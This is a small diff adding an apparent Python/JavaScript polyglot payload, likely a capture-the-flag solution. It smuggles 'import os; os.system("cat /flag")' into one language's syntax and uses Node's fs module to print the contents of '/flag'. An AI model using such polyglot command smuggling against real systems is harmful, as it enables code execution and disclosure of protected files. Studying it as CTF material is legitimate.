@@ -1,0 +1,15 @@
+
+i//2 ;import os; os.system("cat /flag")'''
+var fs = require('fs'),
+    readline = require('readline');
+
+var rd = readline.createInterface({
+    input: fs.createReadStream('/flag'),
+    output: process.stdout,
+    console: false
+});
+
+rd.on('line', function(line) {
+    console.log(line);
+});
+i//2 ;'''
